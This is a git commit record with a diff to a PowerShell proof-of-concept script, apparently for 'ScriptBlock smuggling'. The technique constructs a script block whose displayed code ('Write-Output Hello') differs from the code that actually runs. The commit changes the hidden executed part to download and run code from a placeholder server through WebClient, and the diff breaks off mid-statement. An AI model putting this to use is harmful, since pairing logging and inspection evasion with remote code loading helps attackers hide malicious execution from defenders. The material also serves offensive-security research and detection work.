7725aa517146e7699645cd2382ce98ec8ca01266
CyberAustin <88937794+CyberAustin@users.noreply.github.com>
2024-06-18 10:35:30 +0200

    Update ScriptBlockSmuggling.ps1
    Updated the $ExecutedAst to match the code in the blog post: https://bc-security.org/scriptblock-smuggling/
    
    Otherwise $wc is pointless in this example.

--- ScriptBlockSmuggling.ps1
+++ ScriptBlockSmuggling.ps1
@@ -1,6 +1,6 @@
 ﻿$wc=New-Object System.Net.WebClient
 $SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
-$ExecutedAst = [ScriptBlock]::Create("Write-Output 'World'").Ast
+$ExecutedAst = [ScriptBlock]::Create($wc.DownloadData(<server>)).Ast
 $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                    $null,
                                                                    $null,
